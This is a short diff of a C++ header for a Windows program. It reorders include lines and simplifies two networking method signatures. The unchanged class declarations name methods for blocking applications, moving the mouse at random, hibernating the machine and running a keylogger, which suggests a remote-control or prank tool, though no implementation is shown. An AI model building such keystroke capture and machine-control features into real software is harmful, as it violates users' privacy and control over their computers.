@@ -8,10 +8,9 @@
 #define _WIN32_WINNT  0x501
 #define MAX_THREAD 8
 
-#include <windows.h>
-#include <winable.h>
-#include <winsock2.h>
-#include <ws2tcpip.h>
+#include <WinSock2.h>
+#include <WS2tcpip.h>
+#include <Windows.h>
 #include <shellapi.h>
 #include <winbase.h>
 #include <windef.h>
@@ -19,15 +18,16 @@
 #include <winnt.h>
 #include <winreg.h>
 #include <winuser.h>
-#include <cstring>
-#include <iterator>
 #include <iostream>
 #include <fstream>
 #include <stdio.h>
 #include <stdlib.h>
 #include <conio.h>
 #include <ctime>
+#include <string.h>
+#include <cstring>
 #include <string>
+#include <iterator>
 #include <list>
 #include <map>
 
@@ -52,9 +52,9 @@ public:
 	void OpenApp(const char* app);
 	void BlockApps();
 	void UnBlockApps();
-	int StartServer(const char* port, int bufferlength = 512);
+	int StartServer(const char* port);
 	const char* RawRequest(const char * serverAddress, const char* port,
-			const char* request, int bufferlength = 512);
+		const char* request);
 	void Hibernation();
 	void RandMouse();
 	void Keylogger(const char* fileName);
